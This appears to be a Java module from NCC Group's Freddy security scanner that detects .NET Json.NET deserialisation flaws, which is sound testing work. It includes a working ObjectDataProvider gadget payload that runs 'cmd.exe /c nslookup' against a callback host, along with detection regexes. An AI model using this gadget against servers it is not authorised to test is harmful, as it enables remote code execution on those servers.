// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the .NET FastJson library.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JsonDotNetModule extends FreddyModuleBase {
	//ObjectDataProvider payload data
	private static final String OBJD_PREFIX = "{'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','MethodParameters':{'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','$values':['cmd.exe','/c ";
	private static final String OBJD_SUFFIX = "']},'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}}";
	
	protected void initialiseModule() {
		setName("Json.NET");
		setPlatform(TargetPlatform.DOTNET);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		registerPassiveScanIndicator(Pattern.compile("((\")|(%22))((\\$)|(%24))type((\")|(%22))"), IndicatorTarget.REQUEST);
		registerPassiveScanIndicator("Newtonsoft.Json.", IndicatorTarget.RESPONSE);
		
		//Register false positive so passive scan issues don't fire for FastJson
		registerPassiveScanFalsePositiveIndicator(Pattern.compile("((\")|(%22))((\\$)|(%24))types((\")|(%22))"), IndicatorTarget.REQUEST);
		
		registerActiveScanExceptionPayload("{\"$type\":\"\"}", "JsonConvert.DeserializeObject");
		
		registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
	}
	
	protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_OBJDATPRO:
				return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
		}
		return null;
	}
}
